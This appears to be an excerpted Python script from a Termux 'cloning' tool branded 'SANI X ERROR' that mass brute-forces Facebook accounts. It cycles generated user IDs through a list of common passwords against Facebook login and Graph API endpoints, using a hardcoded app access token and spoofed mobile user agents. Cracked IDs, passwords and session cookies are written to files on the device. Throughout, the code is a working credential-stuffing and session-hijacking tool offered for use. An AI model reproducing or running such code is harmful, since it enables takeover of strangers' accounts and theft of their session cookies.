...
os.system('xdg-open https://chat.whatsapp.com/Ckl7rxaFc3TEq3Qj4gKurZ?mode=ac_c')
...
try:
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100082568028960')


#____________UA-SETUP_______#
def SHAPTAR_BACHA():
    ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/415.0.0.29.120;FBDM={density=2.5,width=1080,height=2400};FBLC/en_GB;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/Galaxy A14;FBCA/armeabi-v7a;FBBR/Sani;]'
    return ua
...
os.system(f'xdg-open https://chat.whatsapp.com/Ckl7rxaFc3TEq3Qj4gKurZ?mode=ac_c')
time.sleep(2)
...
\x1b[1;97m           >>>>> [ \x1b[1;91mSANI X ERROR\x1b[1;97m ] <<<<<

\033[1;37;1m -----------------------------------------------
\033[1;92m• AUTHOR       : \033[1;37;45m HASNAIN ERROR \033[0m
\033[1;92m• FACEBOOK     : \033[1;37;43m TECH ERROR \033[0m
\033[1;92m• VERSION      : \033[1;37;41m 3.1 \033[0m
\033[1;92m• STATUS       : \033[1;37m\033[1;42m FREE \033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------""" )
def line():
    print(f'\033[1;37m-----------------------------------------------')
...
def key():
    clear()
    key = "MR-SANII{ERRROR}|•|✓" + str(os.geteuid()) + str(os.getlogin()).replace('u0_a', '')
    print(f" \033[1;32m TOOL IS FREE BUT YOU NEED APPROVAL ")
    print(f" \033[1;32m Your Login Key is  : " + key)
    buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, "https://github.com/HasnainError/Approval/blob/main/Approve.txt")
    ...
    if key in don:
        ...
        print(f"\033[1;32m 0 DAYS APPROVE RS 0")
        print(f"\033[1;32m 0 DAYS APPROVE RS 0")
        print(" \33[37;44m\t WELCOME TO ERROR TOOL AND ENJOY \33[0;m")
        print('\33[1;37m====================================================')     
        # linex()
        ...
        if adi in ['A', 'a', '01', '1']:
            ...
            url_wa = "https://api.whatsapp.com/send?phone=++923278512250&text="
...
def pak():
                ...
                with tred(max_workers=30) as Hamza:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123','khan1122','khan786','pak12345','pakistan','786786','khanjan','janjan','ali786','ali12345','baloch','pak@123','malik786','ali123']
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSANI\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\033[96;1 [SANI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SANI-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SANI-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SANI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SANI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mSANI\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
    ...
    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            ...
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\033[1;32m [SANI-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{ckkk}"
                print('\033[1;32m [🍪] COOKIES :- \033[1;92m'+cookies)                
                open('/sdcard/SANI-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print(f'\r\r\033[1;93m [SANI-CP] '+uid+' | '+pas+'\033[1;91m')
                open('/sdcard/SANI-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:
                continue
...
def rd(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mSANI\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()      
        for pas in passlist:                                          
            access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head = {
    'User-Agent': SHAPTAR_BACHA(),  
    ...
    'access_token': access_token
            ...
            if 'session_key' in po:
                ...
                open('/sdcard/SANI-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
                oks.append(uid)
                ...
                uid = str(po['error']['error_data']['uid'])
                print(f'\r\r\033[1;93m [SANI-CP] '+uid+' | '+pas+'\033[1;91m')
                open('/sdcard/SANI-R-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:
                continue
...
def bd1(ids,passlist):
    ...
    try:
        for ps in passlist:            
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSANI\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()              
            pro = random.choice(SANI())            
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": SANI(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [SANI-OK] '+ids+' | '+ps)                
                print('\033[1;32m [🍪] COOKIES :-\033[1;92m '+coki)                
                open('/sdcard/SANI-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;93m [SANI-CP] '+ids+' | '+ps+'\033[1;91m')
                open('/sdcard/SANI-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mSANI-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSANI\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                ...
                open('/sdcard/ERROR-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print(f'\r\r\033[1;92m [SANI-CP] '+uid+' | '+pas+'\033[1;92m')
                open('/sdcard/ERROR-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:
                continue
